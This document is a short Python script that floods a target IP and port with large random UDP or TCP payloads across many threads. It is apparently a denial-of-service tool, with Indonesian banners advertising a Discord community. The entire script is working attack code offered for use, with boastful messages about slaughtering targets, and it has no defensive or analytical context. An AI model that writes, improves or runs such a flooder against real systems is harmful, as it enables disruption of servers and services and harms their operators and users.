#!/usr/bin/env python3
import random
import socket
import threading

print       (" - - > Pushy COMMUNITY NIH BOS!! < - - ")
print       (" - - > NGERI ABIEZZZ !!!! < - - ")
print       (" - - > PushyGamertag27#7165 <- - ")                                   
print       (" - - > GATERIMA PM AJA ANJING !! < - - ")
print       (" - - > KOMUNITAS GUA? DIBAWAH TOD < - - ")
print       (" - - > https://discord.gg/KFCWrJwupy < - - ")
print       (" - - > GA JOIN = YATIM KATA ILHAM  < - - ")
    
ip = str(input("  Ip:"))
port = int(input(" Port:"))
choice = str(input(" SERIUS MAU NYERANG? (y/n):"))
times = int(input(" Paket Nya Mau Berapa:"))
threads = int(input(" Pelor Nya Tembakin Berapa:"))
def run():
	data = random._urandom(600000)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" Pushy COMMUNITY NIH DEK, BANTAI EVERYBODY ")
		except:
			print("[!] MAMPUS")

def run2():
	data = random._urandom(600000)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" PUSHY COMMUNITY NIH DEK, BANTAI EVERYBODY ")
		except:
			s.close()
			print("[*] MAMPUS")
            
for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
